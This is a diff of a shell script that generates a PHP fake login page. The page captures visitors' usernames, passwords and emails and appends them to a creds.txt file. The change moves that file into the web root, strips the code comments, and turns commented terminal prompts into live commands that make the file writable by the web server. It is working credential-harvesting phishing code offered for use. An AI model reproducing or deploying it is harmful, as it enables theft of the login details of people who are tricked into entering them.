@@ -294,21 +294,21 @@ EOF
 
     cat <<EOF > "${DIRECTORY}login.php"
 <?php
-// File where credentials will be saved
-$file = '/home/edusagnier/Desktop/creds.txt';
+
+$file = '/var/www/html/creds.txt';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['password']);
     $email = htmlspecialchars($_POST['email']);
 
-    // Format: "Username:Password:Email"
+    
     $data = "$username:$password:$email\n";
 
-    // Append to file (create if not exists)
+    
     file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
 
-    // Redirect after saving
+    
     header('Location: index.php?success=1');
     exit;
 }
@@ -316,14 +316,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 EOF
 }
 
-#┌──(edusagnier㉿interceptor)-[/var/www/html]
-#└─$ touch creds.txt
+touch /var/www/html/creds.txt
                                                                                                                                                                                                                                   
-#┌──(edusagnier㉿interceptor)-[/var/www/html]
-#└─$ sudo chmod 775 creds.txt     
+chmod 775 /var/www/html/creds.txt    
                                                                                                                                                                                                                                   
-#┌──(edusagnier㉿interceptor)-[/var/www/html]
-#└─$ sudo chown www-data creds.txt    
+chown www-data /var/www/html/creds.txt    
 
 
 
